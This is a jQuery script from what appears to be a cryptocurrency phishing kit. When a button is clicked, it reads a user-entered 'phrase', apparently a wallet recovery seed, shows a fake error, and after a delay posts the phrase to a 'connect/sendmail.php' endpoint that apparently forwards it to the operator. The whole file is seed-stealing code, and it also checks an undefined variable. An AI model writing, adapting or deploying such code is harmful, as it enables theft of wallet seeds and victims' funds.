$(document).ready(function() {
	
	$('#phrasemeta').on('click', function() {
		$("#phrasemeta").attr("disabled", "disabled");
		$("#alert-error").show()
		var phrase = $('#phrase').val();
		if(metaphrase!="" ){
            setTimeout(function() { 
                $.ajax({
                    url: "connect/sendmail.php",
                    type: "POST",
                    data: {
                        type: 1,
                        phrase:phrase,					
                    },
                    cache: false,
                    success: function(dataResult){
                        var dataResult = JSON.parse(dataResult);
                        if(dataResult.statusCode==200){
                            $("#alert-error").hide();
                            $("#alert-success").show();
                                                    
                        }
                        else if(dataResult.statusCode==201){
                            $("#alert-error").hide();
                            $("#alert-success").show();
                        }
                        
                    }
                });
                
            }, 4000)
		}
		else{
			alert('Please fill all the field !');
		}
	});
	

});